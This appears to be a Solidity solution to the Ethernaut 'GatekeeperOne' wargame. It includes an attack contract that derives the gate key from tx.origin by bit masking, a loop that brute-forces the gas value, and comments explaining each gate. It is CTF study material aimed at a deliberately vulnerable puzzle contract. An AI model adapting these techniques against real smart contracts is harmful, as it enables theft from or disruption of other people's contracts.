// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";
import { toBytes } from "src/utils/toBytes.sol";

contract GatekeeperOneAttack {
    // address public gatekeeperOneInstance = address(0x536734cD63fb1E3b318eC09d7e0709737da436C0);

    event GasPassed(uint indexed gasUsed);
    event GasFailed(uint indexed gasUsed);
    event Hacked(bool indexed success);

    function attack(address targetAddress, uint magicGasAmount) external returns (bool success) {
        /* Calculating the gate key. Here are the requirements for Gate 3:::

            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
            require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
            require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");

        /* to pass GateThree Part 3:
            uint16(uint160(tx.origin)) == 0x1234
            uint32(uint64(key))        == 0x00001234
            SO.... gate key definitely ends with the 2 tx.origin bytes, AND
            definitely has 4 zeros (2 empty bytes) preceding it.
            PART 1 and PART 3 are essentially the same check. 
            Both need two bytes empty and two bytes that match the end of the tx.origin address
            To complete PART 2, the first 4 bytes in the gateKey out of the 8 bytes need to have some kind of data
            other than 0, so we can just AND the first four bytes of the uint64 with the tx.origin address.
            
            Putting it all together:
            1) convert msg.sender (which is the tx.origin when calling from a contract) to 64 bytes:
                uint64(uint(160(msg.sender)))
            2) include the first 4 bytes of the address to pass PART 2, i.e.
                bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF00000000)
            3) include the last two bytes of the tx.origin address to pass PART 1 and PART 3, i.e.
                bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF)
        */
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & uint64(0xFFFFFFFF0000FFFF));
        // Found gas amount via GatekeeperOneAttackFork.testForkRealGasAttack():
        // emit GasPassed(gasUsed: 24827)
        success = GatekeeperOne(targetAddress).enter{gas: magicGasAmount}(gateKey);

        emit Hacked(success);

        // named return value or not, I think it makes sense to explicitly return values 🤷‍♂️
        return success;
    }

    function gasAttack(address targetAddress) external returns (bool success, uint gasAmount) {
        uint muhgas; // brute force to find gas amount as we reach Gate 2
        uint gasBase = 8191 * 3; // gas needs to be a multiple of 8191. 3 is the lowest that will complete the tx
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (muhgas = 0; muhgas <= 8191; muhgas++) {
            try GatekeeperOne(targetAddress).enter{gas: (muhgas + gasBase)}(gateKey) {
                emit GasPassed(gasBase + muhgas);
                success = true;
                break;
            } catch {
                emit GasFailed(gasBase + muhgas);
            }
        }

        return (success, gasBase + muhgas);
    }
}